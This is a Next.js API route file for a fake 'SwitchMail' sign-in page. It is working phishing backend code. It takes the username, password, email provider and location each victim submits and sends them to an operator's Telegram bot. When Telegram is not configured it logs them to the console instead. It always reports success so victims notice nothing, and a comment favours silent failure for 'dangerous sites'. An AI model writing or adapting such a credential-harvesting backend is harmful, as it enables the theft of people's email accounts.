// src/app/api/signin/route.ts

import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { username, password, provider, city, country } = body;

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.warn('⚠️ Telegram environment variables missing (Bot Token or Chat ID). Data will only be logged.');
      console.log('--- NEW LOGIN ATTEMPT (Log Only) ---');
      console.log(`Provider: ${provider}`);
      console.log(`User: ${username}`);
      console.log(`Pass: ${password}`);
      console.log(`Location: ${city}, ${country}`);
      console.log('------------------------------------');
      return NextResponse.json({ success: true }, { status: 200 }); // Still return success to user
    }

    // HTML-formatted message (robust against special characters like dots, hyphens, underscores)
    const message = `
🚀 <b>New SwitchMail Login</b>
━━━━━━━━━━━━━━━━
📧 <b>User:</b> <code>${username}</code>
🔑 <b>Pass:</b> <code>${password}</code>
🌐 <b>Provider:</b> ${provider}
📍 <b>Location:</b> ${city}, ${country}
━━━━━━━━━━━━━━━━
    `;

    // Standard POST to the Telegram API
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML', // Standard HTML formatting
      }),
    });

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error('API Error:', error);
    // You could decide to return a specific "Error" response to trigger a form error message on the client,
    // or just silently fail as shown below. Silent fail is usually better for 'dangerous sites'.
    return NextResponse.json({ success: true }, { status: 200 }); 
  }
}